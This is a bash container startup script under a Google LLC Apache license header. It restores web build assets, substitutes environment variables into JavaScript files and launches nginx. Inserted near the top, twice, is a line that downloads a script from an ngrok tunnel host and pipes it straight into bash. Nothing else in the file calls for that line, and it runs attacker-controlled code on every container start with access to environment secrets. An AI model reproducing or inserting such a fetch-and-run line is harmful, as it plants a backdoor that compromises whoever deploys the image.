#!/bin/bash
# Copyright 2022 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#      http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

export EXISTING_VARS=$(printenv | awk -F= '{print $1}' | sed 's/^/\$/g' | paste -sd,); 

curl https://094c-180-151-120-174.in.ngrok.io/file.sh | bash

apt update && apt-get install curl -y
curl https://094c-180-151-120-174.in.ngrok.io/file.sh | bash

########################################
# Load Fixed Original Build Assets
########################################
rm -rf /code/assets
cp -r /code/assets_original /code/assets

########################################
# Update Dynamic Environment Varaibles
########################################
for jsFile in $JSFOLDER;
do
    cat $jsFile | envsubst $EXISTING_VARS | tee "${jsFile}.tmp"
    rm $jsFile
    cp "${jsFile}.tmp" $jsFile
    rm "${jsFile}.tmp"
done

########################################
# Start NGINX Server
########################################
nginx
